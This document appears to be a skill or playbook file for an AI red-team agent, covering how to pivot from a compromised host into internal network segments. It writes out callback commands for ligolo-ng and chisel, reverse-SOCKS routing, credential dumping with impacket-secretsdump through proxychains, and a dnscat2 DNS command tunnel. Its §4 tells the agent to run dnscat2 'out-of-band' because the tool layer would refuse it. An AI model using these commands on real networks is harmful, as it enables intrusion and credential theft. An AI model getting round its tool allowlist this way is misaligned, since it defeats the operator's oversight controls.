---
name: playbook-pivoting
description: Pivoting + tunneling into internal segments from a foothold — ligolo-ng agent/relay autoroute and double-pivot chaining, chisel reverse-SOCKS, proxychains to route tool traffic through the pivot, and a DNS-tunnel fallback (dnscat2) for egress-restricted networks. Load when a compromised host reaches a network segment your Kali box cannot route to directly (network/red-team lane).
prerequisite: Code execution / a shell on a host that has an interface into a segment you cannot reach directly (dual-homed foothold, internal jump box, DMZ pivot). This is the network/red-team lane — evidence is the operator log, not a Burp logger_index.
stop_condition: The target internal segment is reachable through the tunnel AND at least one tool (nmap/nxc/impacket) has enumerated it through the pivot → checkpoint the route and move to the lateral/privesc playbooks. If no egress channel works (all TCP + DNS blocked), record the constraint and pivot to on-host-only enumeration.
---

# Pivoting + Tunneling Playbook

Load when: you own a host that straddles a boundary — it has a route into an internal segment (10.x / 172.16.x / a separate VLAN) that your Kali box cannot reach directly. Pivoting turns that foothold into a router so Kali's tools reach the internal targets. Burp-blind — record the tunnel setup and every routed action with `record_redteam_action`; cite operator-log ids.

## SMART MOVE — first three actions

1. **Confirm the reachable segment from the foothold** — `ipconfig /all` / `ip a`, `route print` / `ip route`, `arp -a`. Identify the interface + subnet Kali can't route to. That subnet is what you tunnel to.
2. **Pick the channel by what egress the foothold allows** (§0). TCP outbound to your box → **ligolo-ng** (§1, the default — cleanest autoroute). No inbound to the foothold but outbound TCP works → **chisel reverse-SOCKS** (§2). Only DNS leaves the network → **dnscat2** (§4, fallback).
3. **Stand up the tunnel, add the route, verify with one scan through it** — a single `nmap -sT` or `nxc smb <internal-cidr>` proving the internal host answers *through the pivot* before you build the rest of the attack on top of it.

`run_network_tool` sanctions `ligolo-ng` / `ligolo-proxy`, `chisel`, and `sshuttle` (Rule 26a lane: Burp-blind, evidence = operator log). `proxychains` is a client-side wrapper (§3), not a `run_network_tool` binary. `dnscat2` is **not yet sanctioned** — see §4.

## §0 Channel selection

| Foothold egress reality | Channel | Why |
|---|---|---|
| Foothold can make outbound TCP to your box on an arbitrary port | **ligolo-ng** (§1) | TUN-based autoroute; whole subnets reachable with no per-port forwards; supports double-pivot |
| Outbound TCP to your box, but you want a plain SOCKS proxy (no TUN/root) | **chisel** reverse-SOCKS (§2) | single binary, SOCKS5 into the segment; pair with proxychains |
| SSH creds to the pivot, want quick subnet routing without extra tooling | **sshuttle** | `sshuttle -r user@pivot <cidr>` — VPN-over-SSH; sanctioned |
| Only DNS resolves outbound (TCP/UDP egress blocked/filtered) | **dnscat2** (§4) | tunnels a shell/relay over DNS queries; slow, loud on DNS logs, last resort |

Always prefer the highest-bandwidth channel the egress allows — DNS tunneling is a fallback, not a default.

## §1 ligolo-ng (agent + relay, autoroute) — the default

ligolo-ng runs a **proxy/relay on Kali** and a small **agent on the foothold**; it creates a `ligolo` TUN interface on Kali, and any route you add pointing at that interface is transparently carried to the agent's network. No per-port forwarding.

On Kali (relay):
```
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                       # relay listens on :11601 (self-signed for labs; use -certfile under RoE)
```
On the foothold (agent — stage it via a LOLBAS/HTTP download):
```
agent.exe -connect <kali-ip>:11601 -ignore-cert          # Windows
./agent -connect <kali-ip>:11601 -ignore-cert            # Linux
```
Back in the proxy console, select the session and add the route to the internal subnet:
```
ligolo-ng » session                     # pick the agent
ligolo-ng » ifconfig                     # read the agent's interfaces/subnets
# on Kali, in another shell:
sudo ip route add 10.10.20.0/24 dev ligolo
ligolo-ng » start                        # start the relay for the selected session
```
Now `nmap -sT 10.10.20.0/24`, `nxc smb 10.10.20.0/24`, and impacket tools run **from Kali directly** against the internal subnet. (`-sT` connect scan — raw SYN doesn't traverse the userland TUN.)

### Double-pivot (chaining a second hop)
When an internal host reached through the first pivot itself straddles a *deeper* segment, add a **listener** on the first agent that forwards to a second relay port, run a second agent on the deeper host through it, and add a route for the deeper subnet:
```
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp   # on agent-1, forward deeper agent's callback back to Kali
# agent-2 on the deep host connects to agent-1:11601 → surfaces as a new session on Kali
sudo ip route add 10.10.30.0/24 dev ligolo                                   # route the deeper subnet
```
Each hop is one route + one session; keep a note of which subnet maps to which session so you can tear down cleanly. `redteam_tool_guide(tool="ligolo-ng")` for install.

## §2 chisel (reverse SOCKS)

When you want a plain SOCKS5 proxy (no TUN, no root on Kali) and the foothold can reach you outbound:

On Kali (server):
```
chisel server -p 8080 --reverse                          # listen for reverse clients
```
On the foothold (client — dials back, opens a reverse SOCKS):
```
chisel client <kali-ip>:8080 R:1080:socks                # SOCKS5 on Kali:1080 → foothold's network
```
Now Kali:1080 is a SOCKS5 entry into the foothold's segment. Drive tools through it with proxychains (§3). For a single-port forward instead of full SOCKS: `R:9000:10.10.20.5:445` maps Kali:9000 → internal `10.10.20.5:445`. chisel is sanctioned (`run_network_tool tool="chisel"`); it is not in the `redteam_tool_guide` catalog, so install from the upstream release (`github.com/jpillora/chisel`) — same static-binary staging as ligolo's agent.

## §3 proxychains (route tool traffic through the pivot)

proxychains forces a tool's TCP connections through a SOCKS/HTTP proxy — the chisel SOCKS from §2, or ligolo's built-in SOCKS if you use it instead of the TUN route. It is a **client-side config on Kali**, not a target action and not a `run_network_tool` binary; it wraps other (sanctioned) tools.

`/etc/proxychains4.conf` (or a local copy passed with `-f`):
```
[ProxyList]
socks5 127.0.0.1 1080          # match the chisel/ligolo SOCKS port
```
Then prefix any tool:
```
proxychains -q nmap -sT -Pn -p 445,3389,5985 10.10.20.5
proxychains -q nxc smb 10.10.20.0/24 -u user -p 'pass'
proxychains -q impacket-secretsdump 'DOM/user:pass@10.10.20.5'
```
Notes: use `-sT -Pn` with nmap (proxychains carries TCP connect only, no ICMP/UDP/raw); set `proxy_dns` in the conf if you need internal name resolution through the tunnel; keep `-q` to quiet the per-connection chatter. With ligolo's TUN route (§1) proxychains is unnecessary — the route handles it; proxychains is the pairing for chisel/SOCKS-only channels.

## §4 dnscat2 (DNS-tunnel fallback — egress-restricted networks)

Use ONLY when TCP/UDP egress is blocked but the network still resolves DNS through an internal resolver that reaches the internet (a common enterprise choke point). dnscat2 tunnels a command channel / relay over DNS queries to an authoritative server you control for a delegated domain.

```
# Kali (server), authoritative for tunnel.example.com:
dnscat2-server tunnel.example.com
# foothold (client):
./dnscat2 tunnel.example.com                     # or --dns server=<kali-ip> for direct
```
Trade-offs: very low bandwidth, high latency, and **loud on DNS logs** (long TXT/CNAME query bursts) — a detection trade you accept only when nothing else egresses. Prefer ICMP or a higher-band channel first if either is open.

**Not yet sanctioned:** `dnscat2` is **not** in `run_network_tool`'s `_SANCTIONED` set (`tools/network/run_tool.py`) or the `redteam_tool_guide` catalog (`tools/redteam/_tooling.py`). It is a NEW tool suggestion recorded here — running it today would be refused by the tool layer. Landing it (adding `dnscat2` to `_SANCTIONED` + a tier-C `_tooling.py` entry, ATT&CK T1071.004 Application Layer Protocol: DNS) is owned by a different agent who edits `run_tool.py`. Until then, run it out-of-band and record the tunnel manually with `record_redteam_action`, or ask the operator for an alternative DNS-tunnel channel (iodine, or a Collaborator-style callback for pure OOB confirmation).

## Evidence + Praetor integration

- Tunnel setup + every routed action → `record_redteam_action(domain, tool=..., command=..., description="pivot via <foothold> into <subnet>", target=<internal-host>)`. `ligolo-ng` and `chisel` auto-tag T1090 (Proxy) in the oplog map; annotate the deeper hops in `description=` so the kill chain reads cleanly.
- Internal hosts/services discovered through the pivot → `save_target_intel` / `get_network_inventory`; hashes/creds captured on the far side → `record_loot` + `record_credential`, then reuse via `list_credentials` → `run_network_recon(<internal-host>, creds=...)`.
- Checkpoint the route map (which subnet ↔ which session/port) with `write_checkpoint` — a tunnel that lives only in your terminal is lost on compaction (Rule 31).
- Forward the kill chain: `sync_to_ghostwriter(domain)`.

## Tools

`redteam_tool_guide(tool="ligolo-ng")` (install + alternatives). Sanctioned via `run_network_tool`: `ligolo-ng` / `ligolo-proxy`, `chisel`, `sshuttle`. Client-side wrapper (Kali, not a target action): `proxychains`. **Not yet sanctioned** (tracking note, §4): `dnscat2`. Once the segment is reachable, hand off to `playbook-ad-lateral-delegation.md` (AD movement) / `playbook-linux-privesc.md` / `playbook-windows-privesc.md` for the far-side hosts.
